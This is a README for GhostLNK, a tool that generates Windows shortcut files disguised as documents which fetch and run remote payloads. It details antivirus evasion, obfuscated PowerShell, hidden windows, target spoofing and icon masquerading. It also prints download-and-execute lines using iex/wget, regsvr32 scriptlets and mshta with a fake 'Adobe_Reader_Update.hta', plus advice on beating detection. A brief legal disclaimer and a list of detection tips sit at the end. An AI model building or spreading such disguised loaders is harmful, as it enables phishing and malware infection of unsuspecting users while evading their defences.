<p align="center">
  
# 👻 GhostLNK - Advanced LNK Generator with Evasion 👻

[![Python](https://img.shields.io/badge/Python-3.8+-blue.svg)](https://www.python.org/)
[![PyQt6](https://img.shields.io/badge/PyQt6-6.0+-green.svg)](https://www.riverbankcomputing.com/software/pyqt/)
[![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey.svg)](https://www.microsoft.com/windows)
[![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![GitHub](https://img.shields.io/badge/GitHub-Excalibra-purple?style=flat&logo=github)](https://github.com/Excalibra/)

</p>

<img width="1916" height="912" alt="image" src="https://github.com/user-attachments/assets/1d0265ca-d489-4ee1-b75f-65c937c835eb" />

---

## Overview

**GhostLNK** is a professional‑grade Windows LNK (Shortcut) file generator with advanced stealth capabilities and an intuitive step‑by‑step workflow. Designed for security researchers, penetration testers, and red team operations, it enables the creation of sophisticated LNK files that can bypass modern antivirus detection while maintaining realistic appearances.

### Use Cases

- Security Research & Malware Analysis
- Red Team Operations & Penetration Testing
- Phishing Simulation & User Awareness Training
- Educational Demonstrations of Attack Vectors

---

## Key Features

### 🚀 Advanced Payload Generation

| Feature | Description |
|---------|-------------|
| **📁 Download & Open** | Downloads files to temp directory and opens them with default applications |
| **⚡ Memory Execution** | Executes PowerShell scripts directly in memory – no files written to disk |
| **🕵️ Ultra Stealth Mode** | Minimal output with obfuscated commands for maximum AV evasion |
| **🎯 Raw Target Mode** | Bypass PowerShell entirely – run any executable (mshta.exe, cmd.exe, custom tools) with custom arguments |

### 🛡️ Advanced Evasion Techniques

GhostLNK implements modern "Living off the Land" (LotL) and structural evasion methods:

| Technique | Description |
|-----------|-------------|
| **conhost.exe Proxy** | Launches PowerShell via the trusted `conhost.exe` binary to evade parent‑process detection. |
| **LNK Stomping (Target Spoofing)** | Makes the LNK appear to point to a benign file (e.g., `invoice.pdf`) while actually executing the payload. This bypasses static analysis that inspects the displayed target path. |
| **regsvr32.exe Proxy (Fileless)** | Executes a remote scriptlet (SCT) or DLL using `regsvr32.exe`. The command `regsvr32 /s /n /i:"http://server/payload.sct" scrobj.dll` runs entirely in memory, leaving no disk artifacts. |

### Multi‑Level Stealth System

| Level | Name | Description | AV Evasion |
|-------|------|-------------|------------|
| 0 | Normal | Standard output, visible window | ❌ Low |
| 1 | Moderate | Uses aliases, avoids obvious patterns | ⚠️ Medium |
| 2 | Maximum | Obfuscated code, no suspicious flags, AV bypass attempt | ✅ High |

### Professional GUI Features

- **Step‑by‑Step Workflow** – Clear 5‑step process with visual progress indicators
- **Smart Conflict Resolution** – Automatic option disabling with visual feedback
- **Real‑Time Visual Feedback** – Green highlights for active selections, gray for disabled
- **Tooltip Explanations** – Hover over any control for detailed help
- **Dark Theme Interface** – Easy on the eyes during long analysis sessions
- **Real‑Time URL Validation** – Automatic Dropbox URL checking with `dl=1` detection
- **Icon Masquerading** – 8+ realistic icon options (PDF, Word, Excel, etc.)
- **Live Console Output** – Real‑time logging and debugging information
- **Multi‑Format Support** – Generate LNK files with customizable names and extensions
- **Smart Import** – Automatically adds `-E` prefix to base64 strings when pasted manually

### Technical Capabilities

- **Base64 Encoding** – Automatic PowerShell command encoding (UTF‑16LE)
- **Smart Payload Detection** – Auto‑suggests payload type based on URL extension
- **Recent History** – Saves recent URLs and conversions for quick access
- **Cross‑Format Export** – Copy commands, arguments, or generate complete LNK files
- **Raw Target Execution** – Directly invoke any Windows executable with full argument control

---

## Installation

### Prerequisites

```bash
# Python 3.8 or higher required
python --version

# Windows OS (required for LNK file generation)
```

### Quick Setup

```bash
# Clone the repository
git clone https://github.com/Excalibra/GhostLNK.git

# Navigate to directory
cd GhostLNK

# Install dependencies (auto‑installed on first run)
pip install PyQt6 pylnk3

# Make the script executable (optional)
chmod +x ghostlnk.py
```

### Dependencies

GhostLNK automatically installs missing dependencies on first run:

- **PyQt6** – Professional GUI framework
- **pylnk3** – Core LNK file generation engine

---

## Usage Guide

### Launching GhostLNK

```bash
# Basic launch
python ghostlnk.py

# Or make executable and run directly
./ghostlnk.py
```

### Quick Start – 5 Step Workflow (PowerShell Mode)

#### Step 1: Enter Your URL
```
Example: https://www.dropbox.com/scl/fi/abc123/document.pdf?dl=1
```

#### Step 2: Select Payload Type
- **PDF/Image/Document** → Choose "Download & Open"
- **PowerShell Script** → Choose "Memory Execute"
- **Maximum Stealth** → Choose "Ultra Stealth"

#### Step 3: Configure Stealth Level
- **Level 0 (Normal)** – Visible output, for testing
- **Level 1 (Moderate)** – Uses aliases, avoids obvious patterns
- **Level 2 (Maximum)** – Obfuscated code, AV bypass attempt

#### Step 4: Execution Options
- **⏸️ Pause after execution** – Keeps window open (auto‑disabled when incompatible)
- **🐛 Enable Debug Mode** – Verbose output for troubleshooting
- **🔒 Hide PowerShell Window** – Complete invisibility (auto‑disables pause/debug)

> 💡 **Smart Conflict Resolution**: Options automatically disable with visual feedback when incompatible combinations are selected. Hover over any disabled option to see why.

#### Step 5: Generate (Follow the Numbers)
```
⚠️ MUST CLICK IN THIS ORDER: 1 → 2 → 3 → 4

1️⃣ Show Command      → Preview your payload
2️⃣ Encode to Base64  → Generate -E argument
3️⃣ Copy -E Argument  → Copy to clipboard
4️⃣ Generate LNK from URL → Build the LNK file
```

**Visual Progress Tracker:**
```
Progress: ⚪ Step 1 → ⚪ Step 2 → ⚪ Step 3 → ⚪ Step 4
          (Turns green as you complete each step)
```

### Raw Target Mode

Sometimes you don't want PowerShell at all. **Raw Target Mode** lets you generate LNK files that execute any program directly – perfect for `mshta.exe`, `rundll32.exe`, `cmd.exe`, or your own tools.

#### How to Use Raw Target Mode

1. **Enable Raw Target Mode** – Check the box in the right panel.
2. **Set Target Path** – Full path to the executable (e.g., `C:\Windows\System32\mshta.exe`).
3. **Set Arguments** – Any command‑line arguments.  
   *Note: URLs should be enclosed in quotes – optional but safe.*  
   Example: `"https://example.com/script.hta"`
4. **Working Directory (optional)** – e.g., `%TEMP%` or `C:\Users\Public`.
5. **Choose Icon & Output Name** – Same as always.
6. **Generate LNK** – The shortcut will run your raw target directly.

#### Example: mshta.exe with Remote HTA

```
Target Path: C:\Windows\System32\mshta.exe
Arguments:   "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/main/Adobe_Reader_Update.hta"
```

> 💡 **Why use Raw Target Mode?**  
> - Avoid PowerShell detection entirely  
> - Execute traditional binaries with custom flags  
> - Run HTA, VBS, or any other script host  
> - Perfect for living‑off‑the‑land (LOLBins) techniques

### Importing Existing Base64 Strings

If you have a pre‑existing base64 encoded PowerShell command (from another tool), paste it directly into the **Import -E Argument** field and click **Import**. GhostLNK will automatically add the `-E` prefix if it's missing.

```
Example:
Paste: SQBFAFgAIAAoAE4AZ...
Click Import → Automatically becomes: -E SQBFAFgAIAAoAE4AZ...
```

### Advanced Evasion Options

Located in the right panel under **🛡️ Advanced Evasion**:

| Option | What It Does | When to Use |
|--------|--------------|-------------|
| **conhost.exe Proxy** | Changes the LNK target to `conhost.exe` and passes PowerShell as an argument. | Evade parent‑process monitoring that looks for direct `powershell.exe` launches. |
| **LNK Stomping** | Makes the shortcut appear to point to a fake path (e.g., `C:\Users\Public\Documents\invoice.pdf`). | Bypass static analysis tools that inspect the LNK's displayed target. |
| **regsvr32.exe Proxy** | Uses `regsvr32.exe` to fetch and execute a remote scriptlet (SCT) or DLL. | Achieve fileless execution – the payload never touches disk. |

**Important:** These options can be combined (except regsvr32 overrides PowerShell‑based payloads). The GUI will handle conflicts automatically.

---

## Stealth Mode Deep Dive

### Why Stealth Matters

Modern antivirus solutions actively monitor for:
- `-WindowStyle Hidden` flags
- Long encoded PowerShell commands
- Suspicious combinations of arguments
- Known malicious patterns

### Maximum Stealth (Level 2) Techniques

```powershell
# Instead of this (easily detected):
powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -E SQBFAFgAIAAoAE4AZ...

# GhostLNK Level 2 generates:
powershell.exe -E SQBFAFgAIAAoAE4AZ...

# Payload is obfuscated:
iex (wget -useb "https://your-server.com/payload.ps1");
```

### Stealth Comparison

| Technique | Level 0 | Level 1 | Level 2 |
|-----------|---------|---------|---------|
| `-WindowStyle Hidden` | ✅ | ❌ | ❌ |
| Full Cmdlet Names | ✅ | ❌ | ❌ |
| PowerShell Aliases | ❌ | ✅ | ✅ |
| Variable Obfuscation | ❌ | ❌ | ✅ |
| Comment Removal | ❌ | ✅ | ✅ |
| Minimal Output | ❌ | ✅ | ✅ |

---

## Payload Examples

### Download & Open Mode (Stealth Level 2)
```powershell
# Generated command
$u="https://dropbox.com/file.pdf?dl=1";$t=[IO.Path]::GetTempPath();$f=[IO.Path]::Combine($t,"doc.pdf");(New-Object Net.WebClient).DownloadFile($u,$f);Start "$f";
```

### Memory Execute Mode (Stealth Level 2)
```powershell
# Generated command
iex (wget -useb "https://your-server.com/script.ps1");
```

### Raw Target Mode (mshta.exe)
```
Target: C:\Windows\System32\mshta.exe
Arguments: "https://example.com/update.hta"
```

### regsvr32 Proxy (Fileless)
```
Target: C:\Windows\System32\regsvr32.exe
Arguments: /s /n /i:"http://192.168.1.100/payload.sct" scrobj.dll
```

---

## Configuration

### Settings File (`ghostlnk_config.json`)
```json
{
    "recent_urls": [
        "https://dropbox.com/s/abc123/file.pdf?dl=1",
        "https://your-vps.com/script.ps1"
    ],
    "recent_conversions": [
        "-E SQBFAFgAIAAoAE4AZ..."
    ]
}
```

### Customizing Icon Database
Edit the `ICON_DATABASE` dictionary in `ghostlnk.py`:
```python
ICON_DATABASE = {
    "Custom Application": (r"C:\Path\to\your\app.exe", 0, ".custom"),
    # Add your own entries...
}
```

---

## Performance Metrics

| Operation | Time |
|-----------|------|
| GUI Launch | < 2 seconds |
| URL Validation | < 100ms |
| Base64 Encoding | < 50ms |
| LNK File Generation | < 200ms |
| Memory Usage | ~50-80 MB |

---

## Project Structure

```
GhostLNK/
├── ghostlnk.py                 # Main application
├── README.md                    # Documentation
├── LICENSE                      # MIT License
├── ghostlnk_config.json         # Auto-generated config
└── requirements.txt             # Dependencies (optional)
```

---

## Educational Resources

### Understanding LNK Attacks
- [Microsoft LNK File Format Specification](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/)
- [MITRE ATT&CK - LNK Files (T1204.002)](https://attack.mitre.org/techniques/T1204/002/)
- [Red Team LNK Tradecraft](https://redteam.guide/docs/Execution/LNK)

### Detection & Prevention
- Monitor PowerShell event logs (Event ID 4104, 4103)
- Enable AMSI (Antimalware Scan Interface)
- Deploy application whitelisting
- Implement user awareness training

---

## Legal & Ethical Use

**IMPORTANT:** GhostLNK is designed for:

✅ **Authorized Security Testing** – With written permission from system owners  
✅ **Educational Purposes** – Learning about attack vectors and defense  
✅ **Incident Response** – Simulating attacks to test defenses  
✅ **Research** – Understanding malware capabilities  

**UNAUTHORIZED USE IS STRICTLY PROHIBITED**

- ❌ Do not use on systems you don't own
- ❌ Do not use for malicious purposes
- ❌ Do not distribute malicious LNK files
- ❌ Do not bypass security controls without authorization

---

## Contributing

We welcome contributions from the security community!

### How to Contribute

1. **Fork the Repository**
   ```bash
   git clone https://github.com/Excalibra/GhostLNK.git
   ```

2. **Create a Feature Branch**
   ```bash
   git checkout -b feature/amazing-feature
   ```

3. **Commit Your Changes**
   ```bash
   git commit -m 'Add amazing feature'
   ```

4. **Push to Your Fork**
   ```bash
   git push origin feature/amazing-feature
   ```

5. **Open a Pull Request**

### Development Guidelines

- Follow PEP 8 style guidelines
- Add comments for complex logic
- Update documentation for new features
- Test thoroughly before submitting

---

## Troubleshooting

### Common Issues & Solutions

**Q: LNK file doesn't execute properly**
- Verify URL is accessible
- Check Dropbox URLs have `dl=1`
- Ensure target system has PowerShell (or your raw target exists)

**Q: Antivirus still detects the file**
- Increase stealth level to 2
- Use Memory Execute mode
- Try **Raw Target Mode** or **regsvr32 Proxy** for fileless execution

**Q: GUI won't launch**
- Install PyQt6: `pip install PyQt6`
- Check Python version: `python --version`
- Verify Windows OS

**Q: Options stay grayed out after deselection**
- This was fixed in recent updates; ensure you have the latest code.

**Q: Not sure which order to click buttons**
- Follow the numbered steps (1️⃣ → 2️⃣ → 3️⃣ → 4️⃣)
- Watch the progress indicators turn green

**Q: Import field doesn't add `-E` automatically**
- Click the **Import** button after pasting; the tool will add the prefix if missing.

**Q: LNK Stomping not working?**
- Ensure the spoof path is a valid Windows path (e.g., `C:\Users\Public\Documents\invoice.pdf`). The LNK will display that path but execute the real payload.

---

## Acknowledgments

- Thanks to the pylnk3 developers for the core LNK engine
- Inspired by real‑world APT techniques and red team tools
- Special thanks to the security research community

---

<p align="center">
  <b>👻 GhostLNK – Advanced Evasion LNK Generator 👻</b><br>
  For authorized security testing and educational purposes only
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Python-3.8+-blue?style=flat-square">
  <img src="https://img.shields.io/badge/Platform-Windows-lightgrey?style=flat-square">
  <img src="https://img.shields.io/badge/License-MIT-yellow?style=flat-square">
</p>
